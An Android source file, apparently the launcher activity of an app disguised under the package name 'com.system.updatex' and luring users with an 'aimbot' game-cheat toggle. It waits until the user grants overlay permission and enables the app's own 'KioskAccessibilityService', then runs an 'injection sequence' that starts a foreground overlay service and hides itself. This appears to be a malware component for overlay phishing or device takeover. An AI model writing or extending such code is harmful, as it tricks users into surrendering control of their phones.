package com.system.updatex;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

public class MainActivity extends Activity {

    private WebView webView;
    private final Handler handler = new Handler(Looper.getMainLooper());
    private boolean isActivated = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        webView = findViewById(R.id.webview);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setDomStorageEnabled(true);
        webView.setWebViewClient(new WebViewClient());
        
        webView.loadUrl("file:///android_asset/index.html");
        webView.addJavascriptInterface(new WebAppInterface(this, this), "Android");
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (!isActivated && Settings.canDrawOverlays(this) && isAccessibilityEnabled()) {
            webView.evaluateJavascript("(function() { return document.getElementById('toggle-aimbot').checked; })();", value -> {
                if ("true".equals(value)) {
                    startInjectionSequence();
                }
            });
        }
    }

    private boolean isAccessibilityEnabled() {
        String enabledServices = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        if (enabledServices == null) return false;
        String component = getPackageName() + "/" + KioskAccessibilityService.class.getName();
        return enabledServices.toLowerCase().contains(component.toLowerCase());
    }

    public void startInjectionSequence() {
        if (isActivated) return;
        isActivated = true;

        runOnUiThread(() -> {
            try {
                Intent serviceIntent = new Intent(MainActivity.this, OverlayService.class);
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                    startForegroundService(serviceIntent);
                } else {
                    startService(serviceIntent);
                }
                handler.postDelayed(this::finish, 1000);
            } catch (Exception e) {
                e.printStackTrace();
            }
        });
    }

    @Override
    protected void onDestroy() {
        handler.removeCallbacksAndMessages(null);
        super.onDestroy();
    }
}
